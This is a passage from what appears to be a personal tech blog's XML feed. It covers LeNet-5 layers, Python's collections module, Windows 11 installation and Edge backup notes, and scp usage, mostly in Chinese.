(C5)</strong>: The last convolutional layer with120 5×5 kernels. Given that the input to this layer is of size 5×5×16and the kernels are of size 5×5, the output is 1×1×120. <strong>As aresult, layers S4 and C5 are fully-connected.</strong> That is also whyin some implementations of LeNet-5 actually use a fully-connected layerinstead of the convolutional one as the 5th layer. The reason forkeeping this layer as a convolutional one is the fact that if the inputto the network is larger than the one used in [1] (the initial input,32×32 in this case), this layer will not be a fully-connected one, asthe output of each kernel will not be 1×1.</p><p>Input: 5x5x16 Proccess: 120 kernels of size 5x5 Output: 1x1x120</p><p>在这里还需要注意的是 C5 层，它是一个比较特殊的卷积层，它的输入是 16通道 <code>5*5</code> 大小的特征图像，而输出是一个 120 的向量。C5层可以有两种实现，第一种是使用 <code>5*5</code>大小的卷积核进行卷积，第二种是将 16 通道 <code>5*5</code>大小的特征图像拉平，然后再做全连接。</p></li><li><p><strong>Layer 6 (F6)</strong>: The first fully-connected layer,which takes the input of 120 units and returns 84 units. In the originalpaper, the authors used a custom activation function — a variant of thetanh activation function. For a thorough explanation, please refer toAppendix A in [1].</p><p>那么全连接层对模型影响参数就是三个：</p><pre><code>全接解层的总层数（长度）单个全连接层的神经元数（宽度）激活函数首先我们要明白激活函数的作用是：增加模型的非线性表达能力</code></pre></li><li><p><strong>Layer 7 (F7)</strong>: The last dense layer, whichoutputs 10 units. In [1], the authors used Euclidean Radial BasisFunction neurons as activation functions for this layer.</p></li></ol><h2id="why-is-the-input-size-of-lenet-5-set-to-32x32-when-it-was-initially-trained-with-mnist-using-28x28-images">Whyis the input size of LeNet-5 set to <code>32x32</code> when it wasinitially trained with MNIST using <code>28x28</code> images?</h2><blockquote><p>The input is a 32x32 pixel image. This is significantly larger thanthe largest character in the database (at most <code>20x20</code> pixelscentered in a <code>28x28</code> field). The reason is that it isdesirable that potential distinctive features such as stroke endpointsor corner can appear in the center of the recep tive field of thehighest-level feature detectors</p><p>from original paper[2]</p></blockquote><h2 id="code">code</h2><p>由于 MNIST 数据集图片尺寸是 28x28 单通道的，而 LeNet-5 网络输入 Input图片尺寸是 32x32，因此使用 transforms.Resize 将输入图片尺寸调整为32x32。</p><p>LeNet-5 trained with MNIST dataset (PyTorch)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ss</span><br></pre></td></tr></table></figure><h2 id="参考">参考</h2><ol type="1"><li><ahref="https://towardsdatascience.com/implementing-yann-lecuns-lenet-5-in-pytorch-5e05a0911320">ImplementingYann LeCun’s LeNet-5 in PyTorch | by Eryk Lewinson | Towards DataScience</a></li><li><a href="https://ieeexplore.ieee.org/document/726791">Gradient-basedlearning applied to document recognition | IEEE Journals &amp; Magazine| IEEE Xplore</a></li><li><ahref="http://vision.stanford.edu/cs598_spring07/papers/Lecun98.pdf">Gradient-basedlearning applied to document recognition pdf</a></li><li><ahref="https://github.com/erykml/medium_articles/blob/master/Computer%20Vision/lenet5_pytorch.ipynb">medium_articles/lenet5_pytorch.ipynbat master · erykml/medium_articles</a></li><li><ahref="https://baozoulin.gitbook.io/neural-networks-and-deep-learning/di-si-men-ke-juan-ji-shen-jing-wang-luo-convolutional-neural-networks/convolutional-neural-networks/foundations-of-convolutional-neural-networks/19-chi-hua-ceng-ff08-pooling-layers">1.9池化层（Pooling layers） - DeepLearning.ai 深度学习课程笔记</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> ml </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CNN </tag>
            
            <tag> convolution </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go through Python collections</title>
      <link href="/blog/2022/07/12/programming/python/1.basic/15.collections/"/>
      <url>/blog/2022/07/12/programming/python/1.basic/15.collections/</url>
      
        <content type="html"><![CDATA[<p>过一遍可能有用的代码和函数，这样在需要类似功能的时候就能够想起来并查询使用。如果每次只是看到了就查一下，自己不会太在意，也不会留下深刻的印象，那么只是认识了这些代码和函数，而不会真正地为自己所用。</p><p>Python 的 collections 模块提供 specialized container datatypes来增强通用目的的内置容器：dict, list, set 和 tuple.</p><table><colgroup><col style="width: 17%" /><col style="width: 82%" /></colgroup><thead><tr class="header"><th>Datatype</th><th>Descriptions</th></tr></thead><tbody><tr class="odd"><td><code>namedtuple()</code></td><td>factory function for creating tuple subclasses with namedfields</td></tr><tr class="even"><td><code>deque</code></td><td>list-like container with fast appends and pops on either end</td></tr><tr class="odd"><td><code>ChainMap</code></td><td>dict-like class for creating a single view of multiple mappings</td></tr><tr class="even"><td><code>Counter</code></td><td>dict subclass for counting hashable objects</td></tr><tr class="odd"><td><code>OrderedDict</code></td><td>dict subclass that remembers the order entries were added</td></tr><tr class="even"><td><code>defaultdict</code></td><td>dict subclass that calls a factory function to supply missingvalues</td></tr><tr class="odd"><td><code>UserDict</code></td><td>wrapper around dictionary objects for easier dict subclassing</td></tr><tr class="even"><td><code>UserList</code></td><td>wrapper around list objects for easier list subclassing</td></tr><tr class="odd"><td><code>UserString</code></td><td>wrapper around string objects for easier string subclassing</td></tr></tbody></table><blockquote><p>reference: <ahref="https://docs.python.org/3/library/collections.html">collections —Container datatypes — Python 3.11.4 documentation</a></p></blockquote><h2 id="improving-code-readability-namedtuple">Improving CodeReadability: namedtuple()</h2><p><code>nametuple()</code> 是 tuple subclasses with named fields,可以通过 dot notation的方式直接访问元组中的值，例如：<code>obj.arr</code>,从而增强代码的可读写性。在需要使用的 tuple 具有多个 items并且构造位置和使用位置距离比较远时，将 tuple 换作 nametuple 最佳。</p><p><code>collections.namedtuple(typename, field_names, *, rename=False, defaults=None, module=None)</code>:</p><ul><li><p><code>typename</code> 是创建的 nametuple的名字，要求是有效命名的字符串</p></li><li><p><code>field_name</code> 是 the list of field names，用来访问tuple 中元素</p><p>可是以下几种 string 相关对象：</p><ul><li>可迭代的字符串对象，例如：<code>["field1", "field2", "field3]</code></li><li>a string with whitespace-separated field names, suchas：<code>"field1 field2 field3"</code></li><li>a string with comma-separated field names, such as<code>field1, field2, field3</code></li><li>a generator expression as field names, such as<code>(field for field in "xy")</code></li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">In [3]: from collections import *</span><br><span class="line"></span><br><span class="line">In [4]: def custom_divmod(x, y):</span><br><span class="line">   ...:     DivMod = namedtuple(&#x27;DivMod&#x27;, &#x27;quotient remainder&#x27;)</span><br><span class="line">   ...:     return DivMod(*divmod(x, y))</span><br><span class="line">   ...:</span><br><span class="line"></span><br><span class="line">In [5]: result = custom_divmod(18, 4)</span><br><span class="line">   ...: result, result.quotient, result.remainder</span><br><span class="line">Out[5]: (DivMod(quotient=4, remainder=2), 4, 2)</span><br></pre></td></tr></table></figure><p>2D point</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">In [7]: Point = namedtuple(&quot;Point&quot;, [&#x27;x&#x27;, &#x27;y&#x27;]) # Use a list of strings as field names</span><br><span class="line"></span><br><span class="line">In [8]: point = Point(2,4)</span><br><span class="line"></span><br><span class="line">In [9]: point.x</span><br><span class="line">Out[9]: 2</span><br><span class="line"></span><br><span class="line">In [11]: Point = namedtuple(&#x27;point&#x27;, &#x27;x y&#x27;) # Use a string with whitespace-separated field names</span><br><span class="line"></span><br><span class="line">In [12]: point = Point(2,4)</span><br><span class="line"></span><br><span class="line">In [14]: point.y</span><br><span class="line">Out[14]: 4</span><br></pre></td></tr></table></figure><p>tuple 是不可变对象, namedtuple 可以通过 <code>_replace</code>来改变值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">In [15]: Person = namedtuple(&quot;Person&quot;, &quot;name job&quot;, defaults = [&#x27;python developer&#x27;])</span><br><span class="line"></span><br><span class="line">In [16]: person = Person(&quot;Jane&quot;); person</span><br><span class="line">Out[17]: Person(name=&#x27;Jane&#x27;, job=&#x27;python developer&#x27;)</span><br><span class="line"></span><br><span class="line">In [18]: # create dictionary from a named tuple</span><br><span class="line">In [20]: person = Person(&quot;Jane&quot;)</span><br><span class="line"></span><br><span class="line">In [21]: person._asdict()</span><br><span class="line">Out[21]: &#123;&#x27;name&#x27;: &#x27;Jane&#x27;, &#x27;job&#x27;: &#x27;python developer&#x27;&#125;</span><br><span class="line"></span><br><span class="line">In [22]: # replace the value of job</span><br><span class="line">In [23]: person = person._replace(job=&quot;web developer&quot;)</span><br><span class="line"></span><br><span class="line">In [24]: person</span><br><span class="line">Out[24]: Person(name=&#x27;Jane&#x27;, job=&#x27;web developer&#x27;)</span><br></pre></td></tr></table></figure><h2 id="counter"><code>Counter</code></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">collections.Counter([iterable-or-mapping]) A Counter is a dict subclass for counting hashable objects.</span><br></pre></td></tr></table></figure><p>传入的参数需要是可迭代对象或者映射，例如：字典，列表，元组等</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [47]: Counter([1,3,3,5,1])</span><br><span class="line">Out[47]: Counter(&#123;1: 2, 3: 2, 5: 1&#125;)</span><br><span class="line"></span><br><span class="line">In [50]: Counter(&quot;hello&quot;)</span><br><span class="line">Out[50]: Counter(&#123;&#x27;h&#x27;: 1, &#x27;e&#x27;: 1, &#x27;l&#x27;: 2, &#x27;o&#x27;: 1&#125;)</span><br></pre></td></tr></table></figure><p>Counter 实际上是使用 for 循环和字典进行计数的封装版，返回字典。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">In [36]: a = Counter(word)</span><br><span class="line">In [37]: word = &quot;mississippi&quot;</span><br><span class="line">In [38]: a = Counter(word)</span><br><span class="line">In [39]: a.keys(), a.values(), a.items()</span><br><span class="line">Out[39]:</span><br><span class="line">(dict_keys([&#x27;m&#x27;, &#x27;i&#x27;, &#x27;s&#x27;, &#x27;p&#x27;]),</span><br><span class="line"> dict_values([1, 4, 4, 2]),</span><br><span class="line"> dict_items([(&#x27;m&#x27;, 1), (&#x27;i&#x27;, 4), (&#x27;s&#x27;, 4), (&#x27;p&#x27;, 2)]))</span><br><span class="line"></span><br><span class="line">In [40]: counter = &#123;&#125;</span><br><span class="line">In [41]: for letter in word:</span><br><span class="line">    ...:     if letter not in counter:</span><br><span class="line">    ...:         counter[letter] = 0</span><br><span class="line">    ...:     counter[letter] += 1</span><br><span class="line">    ...:</span><br><span class="line">In [45]: counter</span><br><span class="line">Out[45]: &#123;&#x27;m&#x27;: 1, &#x27;i&#x27;: 4, &#x27;s&#x27;: 4, &#x27;p&#x27;: 2&#125;</span><br></pre></td></tr></table></figure><h2 id="handling-missing-keys-defaultdict">Handling Missing Keys:defaultdict</h2><p>python 字典直接访问不存在的 key 会保存，因此可以使用 dict 自带的函数get() 来访问，不存在的 key 会返回 None</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">62</span>]: a = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;Jone&quot;</span>, <span class="string">&quot;job&quot;</span>: <span class="string">&quot;developer&quot;</span>&#125;</span><br><span class="line">In [<span class="number">63</span>]: a.get(<span class="string">&quot;height&quot;</span>)</span><br><span class="line">In [<span class="number">64</span>]: a[<span class="string">&quot;height&quot;</span>]</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">KeyError                                  Traceback (most recent call last)</span><br><span class="line">Cell In[<span class="number">64</span>], line <span class="number">1</span></span><br><span class="line">----&gt; <span class="number">1</span> a[<span class="string">&quot;height&quot;</span>]</span><br><span class="line">KeyError: <span class="string">&#x27;height&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">65</span>]: a.get(<span class="string">&quot;height&quot;</span>) == <span class="literal">None</span></span><br><span class="line">Out[<span class="number">65</span>]: <span class="literal">True</span></span><br></pre></td></tr></table></figure><p><code>class collections.defaultdict(default_factory=None[,&#123;key1:value1,..&#125;])</code></p><p><code>defaultdict</code> 相对于 dict 增加的两个功能: 1. 访问不存在的key 不报错 2. 不存在的 key 的，返回预先定义的默认值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">82</span>]: b = [(<span class="string">&quot;red&quot;</span>, <span class="number">2</span>), (<span class="string">&quot;blue&quot;</span>, <span class="number">4</span>), (<span class="string">&#x27;yellow&#x27;</span>, <span class="number">8</span>), (<span class="string">&#x27;red&#x27;</span>,<span class="number">5</span>)]</span><br><span class="line"></span><br><span class="line">In [<span class="number">83</span>]: <span class="keyword">for</span> name, num <span class="keyword">in</span> b:</span><br><span class="line">    ...:     color[name].append(num)</span><br><span class="line"></span><br><span class="line">In [<span class="number">84</span>]: color</span><br><span class="line">Out[<span class="number">84</span>]: defaultdict(<span class="built_in">list</span>, &#123;<span class="string">&#x27;red&#x27;</span>: [<span class="number">2</span>, <span class="number">5</span>], <span class="string">&#x27;blue&#x27;</span>: [<span class="number">4</span>], <span class="string">&#x27;yellow&#x27;</span>: [<span class="number">8</span>]&#125;)</span><br></pre></td></tr></table></figure><h2 id="keeping-your-dictionaries-ordered-ordereddict">Keeping YourDictionaries Ordered: OrderedDict</h2><p><code>OrderedDict</code>：</p><ol type="1"><li>具备每个 key-value pair的插入顺序，可以在注重顺序的情况下发挥作用</li><li>提供了 <code>.move_to_end()</code>, <code>popitem()</code>方法来操作 pair 的顺序。次卧</li><li>在比较两个 orderdict 时，比较元素与顺序，二者都相同才可。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">87</span>]: letters = OrderedDict(b=<span class="number">3</span>, c = <span class="number">4</span>, e=<span class="number">2</span>, a=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">88</span>]: letters</span><br><span class="line">Out[<span class="number">88</span>]: OrderedDict([(<span class="string">&#x27;b&#x27;</span>, <span class="number">3</span>), (<span class="string">&#x27;c&#x27;</span>, <span class="number">4</span>), (<span class="string">&#x27;e&#x27;</span>, <span class="number">2</span>), (<span class="string">&#x27;a&#x27;</span>, <span class="number">5</span>)])</span><br><span class="line"></span><br><span class="line">In [<span class="number">89</span>]: letters.move_to_end(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">90</span>]: letters</span><br><span class="line">Out[<span class="number">90</span>]: OrderedDict([(<span class="string">&#x27;c&#x27;</span>, <span class="number">4</span>), (<span class="string">&#x27;e&#x27;</span>, <span class="number">2</span>), (<span class="string">&#x27;a&#x27;</span>, <span class="number">5</span>), (<span class="string">&#x27;b&#x27;</span>, <span class="number">3</span>)])</span><br><span class="line"></span><br><span class="line">In [<span class="number">91</span>]: letters.move_to_end(<span class="string">&#x27;b&#x27;</span>, last=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">92</span>]: letters</span><br><span class="line">Out[<span class="number">92</span>]: OrderedDict([(<span class="string">&#x27;b&#x27;</span>, <span class="number">3</span>), (<span class="string">&#x27;c&#x27;</span>, <span class="number">4</span>), (<span class="string">&#x27;e&#x27;</span>, <span class="number">2</span>), (<span class="string">&#x27;a&#x27;</span>, <span class="number">5</span>)])</span><br></pre></td></tr></table></figure><h2 id="chaining-dictionaries-together-chainmap">Chaining DictionariesTogether: ChainMap</h2><p>ChainMap 可以容纳多个 mapping/dictionaries,并比创建一个字典，然后再多次 update() 更新的速度快.它是一个可变的视图,updateable views. 对其进行的修改都会影响到对应的dictionary。</p><p><code>class collections.ChainMap(*maps)</code></p><p>应用场景 1：多个上下文，变量等具有 access priority 的情况：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">In [93]: cmd_proxy = &#123;&#125;</span><br><span class="line">In [94]: local_proxy = &#123;&quot;proxy&quot;: &quot;proxy.local.com&quot;&#125;</span><br><span class="line">In [95]: global_proxy = &#123;&quot;proxy&quot;: &quot;proxy.global.com&quot;&#125;</span><br><span class="line">In [100]: config = ChainMap(cmd_proxy, local_proxy, global_proxy)</span><br><span class="line">In [101]: config[&#x27;proxy&#x27;]</span><br><span class="line">Out[101]: &#x27;proxy.local.com&#x27;</span><br></pre></td></tr></table></figure><p>还有一系列的函数，如 <code>.map</code>返回内部所有的字典的列表。此外还可以对其进行 dict 的操作，只是这些针对dict 的操作，都只针对第一个 dictionary，例如 <code>.pop()</code>,<code>clear()</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">In [105]: config.maps</span><br><span class="line">Out[105]: [&#123;&#125;, &#123;&#x27;proxy&#x27;: &#x27;proxy.local.com&#x27;&#125;, &#123;&#x27;proxy&#x27;: &#x27;proxy.global.com&#x27;&#125;]</span><br><span class="line"></span><br><span class="line">In [106]: config</span><br><span class="line">Out[106]: ChainMap(&#123;&#125;, &#123;&#x27;proxy&#x27;: &#x27;proxy.local.com&#x27;&#125;, &#123;&#x27;proxy&#x27;: &#x27;proxy.global.com&#x27;&#125;)</span><br><span class="line"></span><br><span class="line">In [107]: config.maps</span><br><span class="line">Out[107]: [&#123;&#125;, &#123;&#x27;proxy&#x27;: &#x27;proxy.local.com&#x27;&#125;, &#123;&#x27;proxy&#x27;: &#x27;proxy.global.com&#x27;&#125;]</span><br><span class="line"></span><br><span class="line">In [108]: config[&#x27;proxy&#x27;] = &quot;proxy.cmd.com&quot;</span><br><span class="line"></span><br><span class="line">In [109]: config.maps</span><br><span class="line">Out[109]:</span><br><span class="line">[&#123;&#x27;proxy&#x27;: &#x27;proxy.cmd.com&#x27;&#125;,</span><br><span class="line"> &#123;&#x27;proxy&#x27;: &#x27;proxy.local.com&#x27;&#125;,</span><br><span class="line"> &#123;&#x27;proxy&#x27;: &#x27;proxy.global.com&#x27;&#125;]</span><br><span class="line"></span><br><span class="line">In [111]: config.pop(&#x27;proxy&#x27;)</span><br><span class="line">Out[111]: &#x27;proxy.cmd.com&#x27;</span><br><span class="line"></span><br><span class="line">In [112]: config</span><br><span class="line">Out[112]: ChainMap(&#123;&#125;, &#123;&#x27;proxy&#x27;: &#x27;proxy.local.com&#x27;&#125;, &#123;&#x27;proxy&#x27;: &#x27;proxy.global.com&#x27;&#125;)</span><br></pre></td></tr></table></figure><h2 id="deque"><code>deque</code></h2><p>deque: <strong>d</strong>ouble <strong>e</strong>nded<strong>que</strong>ue,提供双端队列</p><p>主要有 append, pop, popleft, extend, extendleft 等方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">In [113]: d = deque()</span><br><span class="line"></span><br><span class="line">In [114]: d.append(1)</span><br><span class="line"></span><br><span class="line">In [115]: d.append(2)</span><br><span class="line"></span><br><span class="line">In [116]: d.append(3)</span><br><span class="line"></span><br><span class="line">In [117]: d</span><br><span class="line">Out[117]: deque([1, 2, 3])</span><br><span class="line"></span><br><span class="line">In [118]: d[0]</span><br><span class="line">Out[118]: 1</span><br><span class="line"></span><br><span class="line">In [119]:</span><br><span class="line"></span><br><span class="line">In [119]: d.pop()</span><br><span class="line">Out[119]: 3</span><br><span class="line"></span><br><span class="line">In [120]: d.popleft()</span><br><span class="line">Out[120]: 1</span><br><span class="line"></span><br><span class="line">In [121]: d.extend([4,5,6])</span><br><span class="line"></span><br><span class="line">In [122]: d</span><br><span class="line">Out[122]: deque([2, 4, 5, 6])</span><br><span class="line"></span><br><span class="line">In [123]: d.extendleft([7,8,9])</span><br><span class="line"></span><br><span class="line">In [124]: d</span><br><span class="line">Out[124]: deque([9, 8, 7, 2, 4, 5, 6])</span><br></pre></td></tr></table></figure><h2 id="参考">参考</h2><ol type="1"><li><ahref="https://realpython.com/python-collections-module/#chaining-dictionaries-together-chainmap">Python'scollections: A Buffet of Specialized Data Types – Real Python</a></li><li><ahref="https://docs.python.org/3/library/collections.html#defaultdict-objects">collections— Container datatypes — Python 3.11.4 documentation</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> collection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows 11 尝鲜</title>
      <link href="/blog/2022/07/02/misc/win11/"/>
      <url>/blog/2022/07/02/misc/win11/</url>
      
        <content type="html"><![CDATA[<p>一开始希望直接原系统升级，就不用备份数据了，但是好像原 Win10系统本来就更新不顺畅有问题，折腾了一天多，也没搞成。后来干脆，直接重装，世上无难事，只怕有心人。相关工具及链接：</p><p>通过该工具修改 Win11 的 ISO 实现让过 TPM 使我的旧机子也能装上：</p><p><ahref="https://github.com/AveYo/MediaCreationTool.bat">AveYo/MediaCreationTool.bat:Universal MCT wrapper script for all Windows 10/11 versions from 1507 to21H2!</a></p><p>重装 Win11 之后，更新还是检测你机子不满足要求，可直接用下面软件开始Dev channel 预览版更新。 <ahref="https://github.com/abbodi1406/offlineinsiderenroll">abbodi1406/offlineinsiderenroll:OfflineInsiderEnroll - A script to enable access to the Windows InsiderProgram on machines not signed in with Microsoft Account</a></p><p>鼠标，显卡之类的驱动，如果有不正常的，找到了我机子的官网下载: <ahref="https://support.hp.com/cn-zh/drivers/selfservice/hp-pavilion-power-15-cb000-laptop-pc/15551388">HPPavilion Power 15-cb000 笔记本电脑 软件和驱动下载 | 惠普 ®客户支持</a></p><p>据说 rufus 也支持直接写 Win11 no tpm 了，还可以制作 Win togo，真是装机小能手。 <a href="https://rufus.ie/en/">Rufus - Createbootable USB drives the easy way</a></p>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows 双网卡配置</title>
      <link href="/blog/2022/07/02/misc/double_nic/"/>
      <url>/blog/2022/07/02/misc/double_nic/</url>
      
        <content type="html"><![CDATA[<p>参考 <ahref="https://www.wuduoqiang.com/archives/%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8%E6%8C%87%E5%AE%9A%E7%BD%91%E5%8D%A1%E9%85%8D%E7%BD%AE">软件使用指定网卡配置</a></p>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>scp 命令</title>
      <link href="/blog/2022/07/02/linux/tools/ssh_scp/"/>
      <url>/blog/2022/07/02/linux/tools/ssh_scp/</url>
      
        <content type="html"><![CDATA[<h2id="recommend-vscode-连接远程-ssh-之后直接本地文件拖拽至-vscode-目录即可上传右键远程文件即可下载">[Recommend]vscode 连接远程 ssh 之后，直接本地文件拖拽至 vscode目录即可上传，右键远程文件即可下载</h2><h2 id="scp-命令">SCP 命令</h2><p><code>scp [-P port_num] [-r] 源文件 目的地</code></p><p>服务器下载文件到本地（如果为目录, 需要在 <code>scp</code> 后加<code>-r</code>）:<code>scp username@server_ip:/path/filename /tmp/local_destination</code></p><p>如需指定 ssh 端口，在 scp 后跟<code>-P</code>选项，<code>scp -P123 commands</code></p><p>例子：</p><ol type="1"><li><p>本地上传<strong>文件</strong>到 <strong>22端口</strong>服务器:<code>scp /path/local_filename username@server_ip:/path</code></p></li><li><p>本地上传<strong>文件夹</strong>到 <strong>2341端口</strong>服务器：<code>scp -P 2341 -r /path/local_dir username@server_ip:/path</code></p></li></ol><p>常见报错：</p><ol type="1"><li><p>如果出现服务器拒绝，可能是服务器的文件权限问题;如果出现本地拒绝，可能是本地用户以及文件权限问题。</p></li><li><p>如果出现 <code>not a regular file</code>，源服务器上不存在该文件或者该文件不是正常文件,出错原因：</p><ol type="1"><li>源与目的整反了</li><li>目录未加 <code>-r</code></li></ol></li></ol><p>服务器相互拷贝文件</p><ol type="1"><li>首先将自己服务器的 ssh 开启，确保当前用户可以使用</li><li>然后，将复制的目的文件夹在默认用户下的权限提高</li></ol>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Backup of Edge collections and Favorites</title>
      <link href="/blog/2022/07/02/misc/browser_backup/"/>
      <url>/blog/2022/07/02/misc/browser_backup/</url>
      
        <content type="html"><![CDATA[<p>最近更新 Windows 11 尝鲜，更新前特地对 Edge 浏览器进行了同步，然而Favorite 还是丢了，垃圾 Edge 浏览器，Windows同步都做不好，别说跨平台了，也就 Windows 上用用。但是又习惯了 Edge的侧边栏和 collection，所以注意时常备份这两个文件。</p><p>对于密码，我使用 LastPass 插件，跨浏览器。</p><p>Edge collections 备份： 关闭 Edge浏览器，打开下面路径：<code>%userprofile%\AppData\Local\Microsoft\Edge\User Data\Default\Collections</code>，将collectionsSQLite 文件备份</p><p>还原：将该文件复制到上面对应位置覆盖即可。</p><p>Edge favorite 备份： 关闭 Edge浏览器，打开下面路径：<code>"%userprofile%\AppData\Local\Microsoft\Edge\User Data\Default\"</code>，找到<code>Bookmarks</code> 文件备份即可</p><p>还原：将该文件复制到上面对应位置覆盖即可。</p><p>对于 MacOS 可以在 edge 浏览器输入 <code>edge://version/</code>,查看Profile path, 便对应 Windows 的位置了.</p><h2 id="mac-上位置">Mac 上位置</h2><p>浏览器输入：<code>edge://version</code>， Finder跳转到显示的位置即可。</p><h2 id="参考">参考</h2><p><ahref="https://blog.darkthread.net/blog/edge-collections-backup/">Edge集锦备份与搬移-黑暗执行绪</a> <ahref="https://stackoverflow.com/questions/72520979/where-is-the-location-of-microsoft-edge-extension-folder-that-are-installed-on-m">Whereis the location of Microsoft Edge Extension Folder that are installed onMacOS? - Stack Overflow</a></p>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何减少低级 Bugs</title>
      <link href="/blog/2022/07/02/misc/bugs/"/>
      <url>/blog/2022/07/02/misc/bugs/</url>
      
